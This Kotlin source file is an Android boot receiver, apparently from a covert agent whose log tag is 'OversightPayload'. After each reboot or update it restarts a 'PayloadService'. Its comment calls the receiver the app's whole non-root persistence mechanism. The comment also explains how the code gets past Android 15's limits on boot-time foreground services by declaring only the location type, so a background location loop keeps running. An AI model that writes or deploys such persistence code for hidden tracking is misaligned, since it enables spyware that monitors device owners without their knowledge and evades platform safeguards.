package com.mobilesvc.agent

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

/**
 * Restart after reboot or an update.
 *
 * This is the entire non-root persistence mechanism on Android. There is no other hook: no
 * launchd, no systemd, no scheduled task. If this receiver is removed, the app is inert until
 * someone taps its icon.
 *
 * The `fromBoot` flag is not cosmetic. Android 15 forbids starting a foreground service with
 * the `dataSync`, `camera`, `mediaPlayback`, `phoneCall`, `mediaProjection` or `microphone` type
 * from `BOOT_COMPLETED`; the start is refused outright and the service never runs. `location` is
 * not on that list, so the boot path declares location only and the loop starts. Without the
 * flag the service would request `location|dataSync`, be refused, and report boot persistence as
 * working while doing nothing at all.
 */
class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        // Logged on entry: a boot restart that never happens is otherwise indistinguishable from
        // one that was refused, and the only place to see the difference is this line.
        android.util.Log.i(TAG, "boot broadcast: ${intent.action}")
        Diag.log(context, "boot broadcast ${intent.action}")
        val config = PayloadConfig.load(context)
        if (!config.boot) {
            android.util.Log.i(TAG, "boot restart disabled by config")
            Diag.log(context, "boot restart disabled by config")
            return
        }
        runCatching { PayloadService.start(context, fromBoot = true) }
            .onSuccess { Diag.log(context, "boot start dispatched") }
            .onFailure {
                android.util.Log.e(TAG, "boot start refused", it)
                Diag.log(context, "boot start refused: ${it.javaClass.simpleName}: ${it.message}")
            }
    }

    private companion object {
        const val TAG = "OversightPayload"
    }
}
